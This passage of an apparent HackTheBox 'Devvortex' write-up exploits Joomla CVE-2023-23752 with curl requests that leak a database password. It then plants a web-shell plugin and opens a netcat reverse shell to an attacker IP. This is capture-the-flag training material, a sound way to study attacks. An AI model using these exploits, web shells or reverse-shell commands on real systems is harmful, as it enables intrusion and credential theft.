+</span></span></code></pre></div><p>While doing that we also look through the files to see if anything reveals a
+more exact version number or additional information.</p>
+<p><a href="http://dev.devvortex.htb/administrator/manifests/files/joomla.xml" target="_blank" rel="noopener noreffer ">http://dev.devvortex.htb/administrator/manifests/files/joomla.xml</a> reveals
+Joomla is running on <code>4.2.6</code>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-4.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-4.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-4.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-4.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-4.png"
+        title="manifests/files/joomla.xml" width="1792" height="1159" /></p>
+<p>We also run the <code>joomscan</code> tool for further enumeration and exploit
+discovery, but find nothing new.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-5.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-5.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-5.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-5.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-5.png"
+        title="joomscan" width="695" height="1300" /></p>
+<h2 id="joomla-exploitation">Joomla Exploitation</h2>
+<p>The first attempt would be the <code>Joomla! v4.2.8 - Unauthenticated information disclosure</code>
+vulnerability.</p>
+<p>The file details states that it affects: <code>Version: 4.0.0 &lt; 4.2.8 (it means from 4.0.0 up to 4.2.7)</code></p>
+<p>The extension is <code>.py</code> but it&rsquo;s actually a ruby script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ ruby 51334.py http://dev.devvortex.htb
+</span></span><span class="line"><span class="cl">Users
+</span></span><span class="line"><span class="cl"><span class="o">[</span>649<span class="o">]</span> lewis <span class="o">(</span>lewis<span class="o">)</span> - lewis@devvortex.htb - Super Users
+</span></span><span class="line"><span class="cl"><span class="o">[</span>650<span class="o">]</span> logan paul <span class="o">(</span>logan<span class="o">)</span> - logan@devvortex.htb - Registered
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Site info
+</span></span><span class="line"><span class="cl">Site name: Development
+</span></span><span class="line"><span class="cl">Editor: tinymce
+</span></span><span class="line"><span class="cl">Captcha: <span class="m">0</span>
+</span></span><span class="line"><span class="cl">Access: <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Debug status: <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database info
+</span></span><span class="line"><span class="cl">DB type: mysqli
+</span></span><span class="line"><span class="cl">DB host: localhost
+</span></span><span class="line"><span class="cl">DB user: lewis
+</span></span><span class="line"><span class="cl">DB password: P4ntherg0t1n5r3c0n##
+</span></span><span class="line"><span class="cl">DB name: joomla
+</span></span><span class="line"><span class="cl">DB prefix: sd4fg_
+</span></span><span class="line"><span class="cl">DB encryption <span class="m">0</span>
+</span></span></code></pre></div><p>The login works and we store the credentials for potential use later on.</p>
+<pre tabindex="0"><code>DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-6.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-6.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-6.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-6.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-6.png"
+        title="Administrator Home Page" width="1790" height="1162" /></p>
+<p>At initial glance we see more information such as <code>php</code> version <code>7.4.3</code> from the
+error message.</p>
+<pre tabindex="0"><code>We have detected that your server is using PHP 7.4.3 which is obsolete and no longer receives official security updates by its developers. The Joomla! Project recommends upgrading your site to PHP 8.1 or later which will receive security updates at least until 2024-11-25.
+</code></pre><p>After browsing the administrator portal and looking around, two avenues of
+attack come to mind.</p>
+<ol>
+<li>Modify the templates to include a reverse shell.</li>
+<li>Install a malicious joomla extension.</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-7.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-7.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-7.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-7.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-7.png"
+        title="Joomla Templates" width="1791" height="1162" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-8.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-8.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-8.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-8.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-8.png"
+        title="Joomla Extensions" width="1794" height="1163" /></p>
+<p>We decide to install a malicious extension for a web shell since one is readily
+available <a href="https://github.com/p0dalirius/Joomla-webshell-plugin" target="_blank" rel="noopener noreffer ">https://github.com/p0dalirius/Joomla-webshell-plugin</a>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/2023-12-11-hackthebox-devvortex/assets/image-9.png"
+        data-srcset="/posts/2023-12-11-hackthebox-devvortex/assets/image-9.png, /posts/2023-12-11-hackthebox-devvortex/assets/image-9.png 1.5x, /posts/2023-12-11-hackthebox-devvortex/assets/image-9.png 2x"
+        data-sizes="auto"
+        alt="/posts/2023-12-11-hackthebox-devvortex/assets/image-9.png"
+        title="Malicious Extension Installed" width="1558" height="952" /></p>
+<p>We can now use the <code>console.py</code> file as instructed in the web shell plugin
+project readme to access the web shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ python3 console.py -t http://dev.devvortex.htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>webshell<span class="o">]</span>&gt; ls
+</span></span><span class="line"><span class="cl">bin
+</span></span><span class="line"><span class="cl">boot
+</span></span><span class="line"><span class="cl">cdrom
+</span></span><span class="line"><span class="cl">dev
+</span></span><span class="line"><span class="cl">etc
+</span></span><span class="line"><span class="cl">home
+</span></span><span class="line"><span class="cl">lib
+</span></span><span class="line"><span class="cl">lib32
+</span></span><span class="line"><span class="cl">lib64
+</span></span><span class="line"><span class="cl">libx32
+</span></span><span class="line"><span class="cl">lost+found
+</span></span><span class="line"><span class="cl">media
+</span></span><span class="line"><span class="cl">mnt
+</span></span><span class="line"><span class="cl">opt
+</span></span><span class="line"><span class="cl">proc
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">sbin
+</span></span><span class="line"><span class="cl">srv
+</span></span><span class="line"><span class="cl">sys
+</span></span><span class="line"><span class="cl">tmp
+</span></span><span class="line"><span class="cl">usr
+</span></span><span class="line"><span class="cl">var
+</span></span><span class="line"><span class="cl"><span class="o">[</span>webshell<span class="o">]</span>&gt; whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span><span class="line"><span class="cl"><span class="o">[</span>webshell<span class="o">]</span>&gt;
+</span></span></code></pre></div><p>This is not a stable shell so we try to get one in <code>villain</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="o">[</span>webshell<span class="o">]</span>&gt; rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/bash -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc 10.10.14.5 <span class="m">4443</span> &gt;/tmp/f
+</span></span></code></pre></div><p>We have now established our foothold and shell access to the underlying Linux
+server.</p>
+<h3 id="additional-information-and-alternative-routes">Additional Information and Alternative Routes</h3>
+<p>Let&rsquo;s take a break here to understand what&rsquo;s going on. There&rsquo;s an excellent
+writeup on exploit CVE-2023-23752 here <a href="https://vulncheck.com/blog/joomla-for-rce" target="_blank" rel="noopener noreffer ">https://vulncheck.com/blog/joomla-for-rce</a>.</p>
+<p>In a very lacklustre nutshell, this version of Joomla is vulnerable to
+unauthenticated access to plaintext MySQL credentials.</p>
+<p>The &ldquo;CVE-2023-23752 to Code Execution #1&rdquo; section in the writeup gives us more
+insight into how the previously used exploit works.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ curl -v <span class="s2">&#34;http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&#34;</span>
+</span></span><span class="line"><span class="cl">*   Trying 10.10.11.242:80...
+</span></span><span class="line"><span class="cl">* Connected to dev.devvortex.htb <span class="o">(</span>10.10.11.242<span class="o">)</span> port <span class="m">80</span>
+</span></span><span class="line"><span class="cl">&gt; GET /api/index.php/v1/config/application?public<span class="o">=</span><span class="nb">true</span> HTTP/1.1
+</span></span><span class="line"><span class="cl">&gt; Host: dev.devvortex.htb
+</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/8.4.0
+</span></span><span class="line"><span class="cl">&gt; Accept: */*
+</span></span><span class="line"><span class="cl">&gt;
+</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">&lt; Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt; Date: Sat, <span class="m">09</span> Dec <span class="m">2023</span> 06:19:43 GMT
+</span></span><span class="line"><span class="cl">&lt; Content-Type: application/vnd.api+json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl">&lt; Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">&lt; Connection: keep-alive
+</span></span><span class="line"><span class="cl">&lt; x-frame-options: SAMEORIGIN
+</span></span><span class="line"><span class="cl">&lt; referrer-policy: strict-origin-when-cross-origin
+</span></span><span class="line"><span class="cl">&lt; cross-origin-opener-policy: same-origin
+</span></span><span class="line"><span class="cl">&lt; X-Powered-By: JoomlaAPI/1.0
+</span></span><span class="line"><span class="cl">&lt; Expires: Wed, <span class="m">17</span> Aug <span class="m">2005</span> 00:00:00 GMT
+</span></span><span class="line"><span class="cl">&lt; Last-Modified: Sat, <span class="m">09</span> Dec <span class="m">2023</span> 06:19:43 GMT
+</span></span><span class="line"><span class="cl">&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span class="o">=</span>0, pre-check<span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">&lt; Pragma: no-cache
+</span></span><span class="line"><span class="cl">&lt;
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;links&#34;</span>:<span class="o">{</span><span class="s2">&#34;self&#34;</span>:<span class="s2">&#34;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&#34;</span>,<span class="s2">&#34;next&#34;</span>:<span class="s2">&#34;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&#34;</span>,<span class="s2">&#34;last&#34;</span>:<span class="s2">&#34;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline_message&#34;</span>:<span class="s2">&#34;This site is down for maintenance.&lt;br&gt;Please check back again soon.&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;display_offline_message&#34;</span>:1,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;offline_image&#34;</span>:<span class="s2">&#34;&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;sitename&#34;</span>:<span class="s2">&#34;Development&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;editor&#34;</span>:<span class="s2">&#34;tinymce&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;captcha&#34;</span>:<span class="s2">&#34;0&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>* Connection <span class="c1">#0 to host dev.devvortex.htb left intact</span>
+</span></span><span class="line"><span class="cl">:<span class="o">{</span><span class="s2">&#34;list_limit&#34;</span>:20,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;access&#34;</span>:1,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug_lang&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;debug_lang_const&#34;</span>:true,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbtype&#34;</span>:<span class="s2">&#34;mysqli&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;host&#34;</span>:<span class="s2">&#34;localhost&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;lewis&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;password&#34;</span>:<span class="s2">&#34;P4ntherg0t1n5r3c0n##&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;db&#34;</span>:<span class="s2">&#34;joomla&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbprefix&#34;</span>:<span class="s2">&#34;sd4fg_&#34;</span>,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbencryption&#34;</span>:0,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;application&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;224&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;dbsslverifyservercert&#34;</span>:false,<span class="s2">&#34;id&#34;</span>:224<span class="o">}}]</span>,<span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;total-pages&#34;</span>:4<span class="o">}}</span>%
+</span></span></code></pre></div><p>Cleaner <code>jq</code> output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;application&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;224&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;attributes&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;lewis&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">224</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;application&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;224&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;attributes&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;P4ntherg0t1n5r3c0n##&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">224</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="err">,</span>
+</span></span></code></pre></div><p>We can also check for other available MySQL users.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">❯ curl -v <span class="s2">&#34;http://dev.devvortex.htb/api/index.php/v1/users?public=true&#34;</span>
+</span></span><span class="line"><span class="cl">*   Trying 10.10.11.242:80...
+</span></span><span class="line"><span class="cl">* Connected to dev.devvortex.htb <span class="o">(</span>10.10.11.242<span class="o">)</span> port <span class="m">80</span>
+</span></span><span class="line"><span class="cl">&gt; GET /api/index.php/v1/users?public<span class="o">=</span><span class="nb">true</span> HTTP/1.1
+</span></span><span class="line"><span class="cl">&gt; Host: dev.devvortex.htb
+</span></span><span class="line"><span class="cl">&gt; User-Agent: curl/8.4.0
+</span></span><span class="line"><span class="cl">&gt; Accept: */*
+</span></span><span class="line"><span class="cl">&gt;
+</span></span><span class="line"><span class="cl">&lt; HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">&lt; Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">&lt; Date: Sat, <span class="m">09</span> Dec <span class="m">2023</span> 06:45:24 GMT
+</span></span><span class="line"><span class="cl">&lt; Content-Type: application/vnd.api+json<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl">&lt; Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">&lt; Connection: keep-alive
+</span></span><span class="line"><span class="cl">&lt; x-frame-options: SAMEORIGIN
+</span></span><span class="line"><span class="cl">&lt; referrer-policy: strict-origin-when-cross-origin
+</span></span><span class="line"><span class="cl">&lt; cross-origin-opener-policy: same-origin
+</span></span><span class="line"><span class="cl">&lt; X-Powered-By: JoomlaAPI/1.0
+</span></span><span class="line"><span class="cl">&lt; Expires: Wed, <span class="m">17</span> Aug <span class="m">2005</span> 00:00:00 GMT
+</span></span><span class="line"><span class="cl">&lt; Last-Modified: Sat, <span class="m">09</span> Dec <span class="m">2023</span> 06:45:24 GMT
+</span></span><span class="line"><span class="cl">&lt; Cache-Control: no-store, no-cache, must-revalidate, post-check<span class="o">=</span>0, pre-check<span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">&lt; Pragma: no-cache
+</span></span><span class="line"><span class="cl">&lt;
+</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host dev.devvortex.htb left intact</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;links&#34;</span>:<span class="o">{</span><span class="s2">&#34;self&#34;</span>:<span class="s2">&#34;http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/users?public=true&#34;</span><span class="o">}</span>,<span class="s2">&#34;data&#34;</span>:<span class="o">[{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;users&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;649&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;id&#34;</span>:649,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;lewis&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;lewis&#34;</span>,<span class="s2">&#34;email&#34;</span>:<span class="s2">&#34;lewis@devvortex.htb&#34;</span>,<span class="s2">&#34;block&#34;</span>:0,<span class="s2">&#34;sendEmail&#34;</span>:1,<span class="s2">&#34;registerDate&#34;</span>:<span class="s2">&#34;2023-09-25 16:44:24&#34;</span>,<span class="s2">&#34;lastvisitDate&#34;</span>:<span class="s2">&#34;2023-12-09 06:31:24&#34;</span>,<span class="s2">&#34;lastResetTime&#34;</span>:null,<span class="s2">&#34;resetCount&#34;</span>:0,<span class="s2">&#34;group_count&#34;</span>:1,<span class="s2">&#34;group_names&#34;</span>:<span class="s2">&#34;Super Users&#34;</span><span class="o">}}</span>,<span class="o">{</span><span class="s2">&#34;type&#34;</span>:<span class="s2">&#34;users&#34;</span>,<span class="s2">&#34;id&#34;</span>:<span class="s2">&#34;650&#34;</span>,<span class="s2">&#34;attributes&#34;</span>:<span class="o">{</span><span class="s2">&#34;id&#34;</span>:650,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;logan paul&#34;</span>,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;logan&#34;</span>,<span class="s2">&#34;email&#34;</span>:<span class="s2">&#34;logan@devvortex.htb&#34;</span>,<span class="s2">&#34;block&#34;</span>:0,<span class="s2">&#34;sendEmail&#34;</span>:0,<span class="s2">&#34;registerDate&#34;</span>:<span class="s2">&#34;2023-09-26 19:15:42&#34;</span>,<span class="s2">&#34;lastvisitDate&#34;</span>:null,<span class="s2">&#34;lastResetTime&#34;</span>:null,<span class="s2">&#34;resetCount&#34;</span>:0,<span class="s2">&#34;group_count&#34;</span>:1,<span class="s2">&#34;group_names&#34;</span>:<span class="s2">&#34;Registered&#34;</span><span class="o">}}]</span>,<span class="s2">&#34;meta&#34;</span>:<span class="o">{</span><span class="s2">&#34;total-pages&#34;</span>:1<span class="o">}}</span>%
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;users&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;650&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;attributes&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">650</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;logan paul&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;logan&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;email&#34;</span><span class="p">:</span> <span class="s2">&#34;logan@devvortex.htb&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;block&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;sendEmail&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;registerDate&#34;</span><span class="p">:</span> <span class="s2">&#34;2023-09-26 19:15:42&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;lastvisitDate&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;lastResetTime&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;resetCount&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;group_count&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;group_names&#34;</span><span class="p">:</span> <span class="s2">&#34;Registered&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><h2 id="linux-enumeration-and-privilege-escalation">Linux Enumeration and Privilege Escalation</h2>
+<p>Back to our shell, we see the <code>user.txt</code> flag but can&rsquo;t access it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">www-data@devvortex:/$ ls -al /home
+</span></span><span class="line"><span class="cl">total <span class="m">12</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">3</span> root  root  <span class="m">4096</span> Sep <span class="m">26</span> 19:16 .
